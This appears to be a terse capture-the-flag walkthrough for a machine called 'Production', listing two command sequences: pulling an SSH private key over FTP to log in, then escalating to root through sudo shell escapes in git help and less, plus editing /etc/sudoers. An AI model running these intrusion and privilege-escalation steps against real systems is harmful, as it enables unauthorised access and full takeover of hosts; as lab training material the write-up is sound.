# Production
## Method 1
1. `ftp $IP`
2. `get id_rsa` and get `get authorized_keys`
3. `chmod 600 id_rsa`
4. `ssh -l ashu -i id_rsa $IP`
5. `sudo /bin/su skidy`
6. `sudo git help config` and `!/bin/sh`
7. `nano /etc/sudoers` edit
## Method 2
1. `less /etc/profile`
2. `!/bin/sh` or  `v:shell`


